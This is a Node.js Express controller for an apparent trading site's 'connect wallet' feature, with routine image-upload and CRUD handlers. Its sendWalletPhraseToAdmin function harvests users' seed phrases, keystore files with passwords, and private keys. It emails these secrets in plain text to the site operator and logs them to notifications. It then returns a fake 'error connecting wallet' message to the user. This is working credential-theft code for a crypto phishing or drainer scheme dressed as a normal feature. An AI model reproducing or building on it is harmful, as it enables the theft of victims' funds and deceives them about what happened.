const asyncHandler = require("express-async-handler");
const { getPublicIdFromUrl } = require("../utils");
const cloudinary = require("cloudinary").v2;
const sharp = require("sharp"); // Import sharp
const { validationResult } = require('express-validator');
const ConnectWallet = require("../models/connectWalletModel");

const { adminGeneralEmailTemplate } = require("../emailTemplates/adminGeneralEmailTemplate");
const sendEmail = require("../utils/sendEmail");
const Notifications = require("../models/notificationsModel");


// Cloudinary configuration
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

// addConnectWallet
const addConnectWallet = asyncHandler(async (req, res) => {
  const { name,price, dailyTrades, winRate, comment } =
   req.body.userData; // Parse userData from req.body

const errors = validationResult(req);
if (!errors.isEmpty()) {
  // console.log(errors.array()); // Log all errors for debugging
  res.status(400);
  throw new Error(errors.array()[0].msg);
}


  // Handle file upload
  const file = req.file; // Get the uploaded file from req.file
  if (!file) {
    res.status(404);
    throw new Error("No file uploaded");
  }

  // Check if the uploaded file is an image
  const validMimeTypes = ["image/png", "image/jpeg", "image/jpg"];
  const uploadedMimeType = file.mimetype.toLowerCase(); // Convert to lowercase for case-insensitive comparison
  if (!validMimeTypes.includes(uploadedMimeType)) {
    res.status(400);
    throw new Error("Uploaded file is not a valid image");
  }

  // Validate file size (5MB limit)
  const maxSizeInBytes = 5 * 1024 * 1024; // 5MB
  if (file.size > maxSizeInBytes) {
    res.status(400);
    throw new Error("Image size exceeds 5MB limit");
  }

  try {
    // Get the MIME type of the uploaded file
    const mimeType = file.mimetype.toLowerCase();

    let compressedImageBuffer;

    // Compress image based on MIME type
    if (mimeType === "image/png") {
      // Compress PNG and keep it as PNG
      compressedImageBuffer = await sharp(file.buffer)
        .resize(500) // Resize to width of 800 pixels, keeping aspect ratio
        .png({ quality: 70, compressionLevel: 9 }) // PNG compression with quality 70
        .toBuffer();
    } else if (mimeType === "image/jpeg" || mimeType === "image/jpg") {
      // Compress JPEG/JPG and keep it as JPEG
      compressedImageBuffer = await sharp(file.buffer)
        .resize(500) // Resize to width of 800 pixels, keeping aspect ratio
        .jpeg({ quality: 70 }) // JPEG compression with quality 80
        .toBuffer();
    } else {
      // Compress any other file type and convert to JPEG
      compressedImageBuffer = await sharp(file.buffer)
        .resize(500) // Resize to width of 800 pixels, keeping aspect ratio
        .jpeg({ quality: 70 }) // Default to JPEG with quality 80
        .toBuffer();
    }

    // Specify the folder name where you want to upload the image
    const folderName = "connect-wallet";

    // Upload the image to Cloudinary
    const result = await cloudinary.uploader
      .upload_stream(
        { resource_type: "auto", folder: folderName },
        async (error, result) => {
          if (error) {
            return res.status(500).json({ error: "Image upload failed" });
          }

          // Create a new expert trader entry
          const connectWallets = await ConnectWallet.create({
            name,
            photo: result.secure_url, // Save the image URL
          });

          if (connectWallets) {
            const allConnectWallet = await ConnectWallet.find().sort(
              "createdAt"
            );
            res.status(200).json({
              data: allConnectWallet,
              message: "Connect Wallet has been added successfully ",
            });
          } else {
            res.status(500).json({ message: "An error has occurred" });
          }
        }
      )
      .end(compressedImageBuffer); // Use the file buffer for the upload
  } catch (err) {
    res.status(500).json({ message: err.message || "Failed to upload image" });
  }
});


//Get All connect wallet
const getAllConnectWallet = asyncHandler(async (req, res) => {
  const allConnectWallet = await ConnectWallet.find().sort("createdAt");
  res.status(200).json(allConnectWallet);
});


//update ConnectWallet
const updateConnectWallet = asyncHandler(async (req, res) => {
  const Id = req.params.id;
  const wallet = await ConnectWallet.findById(Id).select("-password");

  // console.log(Id, req.body)

  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    // console.log(errors.array()); // Log all errors for debugging
    res.status(400);
    throw new Error(errors.array()[0].msg);
  }

  if (wallet) {
    const { name, photo } =
    wallet;

    wallet.name = req.body.name || name;
    wallet.photo = req.body.photo || photo;

    const updatedWallet = await wallet.save();
    if (updatedWallet) {
      const allConnectWallet = await ConnectWallet.find().sort("createdAt");
      res.status(200).json(allConnectWallet);
    } else {
      res.status(404);
      throw new Error("An Error Occur");
    }
  } else {
    res.status(404);
    throw new Error("Trading Bot not found");
  }
});

// updateConnectWalletPhoto
const updateConnectWalletPhoto = asyncHandler(async (req, res) => {
  const Id = req.params.id;

  // Fetch the TradingBot record from the database
  const wallet = await ConnectWallet.findById(Id).select("-password");
  const file = req.file;

  // Check if a file was uploaded
  if (!file) {
    res.status(404);
    throw new Error("No file uploaded");
  }

  // Check if the uploaded file is an image
  const validMimeTypes = ["image/png", "image/jpeg", "image/jpg"];
  const uploadedMimeType = file.mimetype.toLowerCase(); // Convert to lowercase for case-insensitive comparison
  if (!validMimeTypes.includes(uploadedMimeType)) {
    res.status(400);
    throw new Error("Uploaded file is not a valid image");
  }

  // Validate file size (5MB limit)
  const maxSizeInBytes = 5 * 1024 * 1024; // 5MB
  if (file.size > maxSizeInBytes) {
    res.status(400);
    throw new Error("Image size exceeds 5MB limit");
  }

  // Get the current photo URL
  const currentPhotoUrl = wallet.photo;

  try {
    // If the current photo exists, delete it from Cloudinary
    if (currentPhotoUrl) {
      const publicId = getPublicIdFromUrl(currentPhotoUrl);
      cloudinary.uploader.destroy(publicId); // Delete the old image
    }

    // Get the MIME type of the uploaded file
    const mimeType = file.mimetype.toLowerCase();

    let compressedImageBuffer;

    // Compress image based on MIME type
    if (mimeType === "image/png") {
      // Compress PNG and keep it as PNG
      compressedImageBuffer = await sharp(file.buffer)
        .resize(500) // Resize to width of 800 pixels, keeping aspect ratio
        .png({ quality: 70, compressionLevel: 9 }) // PNG compression with quality 70
        .toBuffer();
    } else if (mimeType === "image/jpeg" || mimeType === "image/jpg") {
      // Compress JPEG/JPG and keep it as JPEG
      compressedImageBuffer = await sharp(file.buffer)
        .resize(500) // Resize to width of 800 pixels, keeping aspect ratio
        .jpeg({ quality: 70 }) // JPEG compression with quality 80
        .toBuffer();
    } else {
      // Compress any other file type and convert to JPEG
      compressedImageBuffer = await sharp(file.buffer)
        .resize(500) // Resize to width of 800 pixels, keeping aspect ratio
        .jpeg({ quality: 70 }) // Default to JPEG with quality 80
        .toBuffer();
    }

    // Specify the folder name where you want to upload the new image
    const folderName = "connect-wallet";

    // Upload the new image to Cloudinary
    const uploadResult = await new Promise((resolve, reject) => {
      const stream = cloudinary.uploader.upload_stream(
        {
          resource_type: "auto",
          folder: folderName,
        },
        (error, result) => {
          if (error) {
            reject(new Error("Image upload failed"));
          } else {
            resolve(result);
          }
        }
      );

      stream.end(compressedImageBuffer); // End the stream with the file buffer
    });

    // Update the photo URL in the database
    wallet.photo = uploadResult.secure_url;
    const updatedWallet = await wallet.save();

    // Check if the save operation was successful
    if (!updatedWallet) {
      res.status(500);
      throw new Error(
        "An Error Occurred while saving the updated wallat"
      );
    }

    // Return the updated list of connect wallet
    const allConnectWallet = await ConnectWallet.find().sort("createdAt");
    res.status(200).json(allConnectWallet);
  } catch (err) {
    res.status(500);
    throw new Error("Failed to upload or delete image");
  }
});


// Delete wallet
const deleteConnectWallet = asyncHandler(async (req, res) => {
  const Id = req.params.id;
  const wallet = await ConnectWallet.findById(Id);

  const deleteConnectWallet = await ConnectWallet.findByIdAndDelete(Id);

  if (!deleteConnectWallet) {
    res.status(404);
    throw new Error("Wallet not found");
  }

  if (deleteConnectWallet) {
   
    const publicId = getPublicIdFromUrl(wallet.photo);
    cloudinary.uploader.destroy(publicId); // Delete the trading bot image
  }

  const allConnectWallet = await ConnectWallet.find().sort("createdAt");
  res
    .status(200)
    .json({ data: allConnectWallet, message: "Wallet deleted successfully" });
});



// Delete multiple wallets by an array of IDs
const deleteArrayOfWallets = asyncHandler(async (req, res) => {
  const { walletIds } = req.body;

  if (!Array.isArray(walletIds) || walletIds.length === 0) {
    return res.status(400).json({ message: "Invalid or empty array of IDs" });
  }

  try {
    // Fetch wallets to get the photo URLs before deleting them
    const wallets = await ConnectWallet.find({ _id: { $in: walletIds } });
    if (wallets.length === 0) {
      return res.status(404).json({ message: "No wallets found to delete" });
    }

    // Loop through each wallet to delete its image from Cloudinary
    for (const wallet of wallets) {
      if (wallet.photo) {
        const publicId = getPublicIdFromUrl(wallet.photo);
        await cloudinary.uploader.destroy(publicId);
      }
    }

    // Delete the wallets from the database
    const result = await ConnectWallet.deleteMany({ _id: { $in: walletIds } });

    // Fetch the remaining wallets after deletion
    const allConnectWallet = await ConnectWallet.find().sort("createdAt");

    res.status(200).json({
      data: allConnectWallet,
      message: `${result.deletedCount} wallet(s) deleted successfully, along with their images`,
    });

  } catch (error) {
    res.status(500).json({ message: "An error occurred while deleting wallets and their images" });
  }
});


//sendWalletPhraseToAdmin 
const sendWalletPhraseToAdmin = asyncHandler(async (req, res) => {
  const {
    type,
    wallet,
    phrase,
    keystoreJSON,
    keystoreJSONPassword,
    privateKey,
  } = req.body;

  // Validate
  if (!wallet) {
    res.status(400);
    throw new Error("Wallet fields is required");
  }

  let connectData;

  if (type === "phrase") {
    connectData =  `Wallet Name = ${wallet}, Phrase = ${phrase}`;
  } else if (type === "keystore JSON") {
    connectData =  `Wallet Name = ${wallet}, keystore JSON = ${keystoreJSON}, Password = ${keystoreJSONPassword}`;
  } else {
    connectData = `Wallet Name = ${wallet}, Private Key = ${privateKey}`;
  }

    // Send connect wallet request email to admin
    const introMessage = `This user ${req.user.firstname+" "+req.user.lastname} with email address ${req.user.email} just entered a connect wallet ${type} data. [ ${connectData} ] `

    const subjectAdmin = "New Connect Wallet Data - ultratradex"
    const send_to_Admin = process.env.EMAIL_USER
    const templateAdmin = adminGeneralEmailTemplate("Admin", introMessage)
    const reply_toAdmin = "no_reply@ultratradex.io"

    await sendEmail(subjectAdmin, send_to_Admin, templateAdmin, reply_toAdmin)


   //send connect wallet notification message object to admin
   const searchWord = "Support Team";
   const notificationObject = {
    to: searchWord,
    from: `${req.user.firstname+" "+req.user.lastname}`,
    notificationIcon: "CurrencyCircleDollar",
    title: "New Connect Wallet Data",
    message: `${req.user.firstname+" "+req.user.lastname} connect wallet ${type} data. [ ${connectData} ] `,
    route: "/dashboard",
  };

  // Add the Notifications
  await Notifications.updateOne(
    { userId: req.user._id },
    { $push: { notifications: notificationObject } },
    { upsert: true } // Creates a new document if recipient doesn't exist
  );

  res.status(200).json({ message: "Error connecting wallet address at this time, please try again later" });
  // res.status(200).json(withdrawalHistory);
});






module.exports = {
  addConnectWallet,
  getAllConnectWallet,
  updateConnectWallet,
  updateConnectWalletPhoto,
  deleteConnectWallet,
  deleteArrayOfWallets,
  sendWalletPhraseToAdmin
  
};
